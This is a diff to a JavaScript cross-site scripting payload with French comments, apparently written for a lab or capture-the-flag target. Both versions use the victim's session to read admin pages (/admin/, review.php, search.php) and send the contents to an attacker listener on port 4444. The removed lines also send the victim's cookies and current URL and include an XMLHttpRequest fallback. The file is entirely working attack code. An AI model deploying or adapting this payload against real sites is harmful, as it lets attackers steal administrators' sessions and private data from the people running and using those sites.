@@ -1,42 +1,17 @@
 const listener = "http://10.139.32.179:4444";
 
-function send(data) {
-    fetch(listener, {
-        method: "POST",
-        mode: "no-cors",
-        body: data
-    });
-}
+// Simple fetch pour chaque page
+fetch("/admin/", { credentials: "include" })
+    .then(r => r.text())
+    .then(t => fetch(listener + "/admin", { mode:"no-cors", body: t }));
 
-// Envoyer d'abord la page actuelle
-send("Current page: " + location.href + "\nCookies: " + document.cookie);
+fetch("/admin/review.php", { credentials: "include" })
+    .then(r => r.text())
+    .then(t => fetch(listener + "/review", { mode:"no-cors", body: t }));
 
-// Récupérer toutes les pages avec fetch
-const pages = [
-    "/admin/",
-    "/admin/review.php",
-    "/admin/search.php"
-];
+fetch("/admin/search.php", { credentials: "include" })
+    .then(r => r.text())
+    .then(t => fetch(listener + "/search", { mode:"no-cors", body: t }));
 
-pages.forEach(url => {
-    fetch(url, { credentials: "include" })
-        .then(r => r.text())
-        .then(body => {
-            // Envoyer l'URL et le contenu
-            send("=== " + url + " ===\n" + body);
-        })
-        .catch(e => {
-            send("ERROR on " + url + ": " + e.message);
-        });
-});
-
-// Envoyer aussi via XMLHttpRequest (fallback)
-setTimeout(() => {
-    const xhr = new XMLHttpRequest();
-    xhr.open("GET", "/admin/", true);
-    xhr.withCredentials = true;
-    xhr.onload = function() {
-        send("XHR /admin/ : " + this.responseText);
-    };
-    xhr.send();
-}, 1000);
+// Fallback: envoyer la page actuelle
+fetch(listener + "/current", { mode:"no-cors", body: location.href });
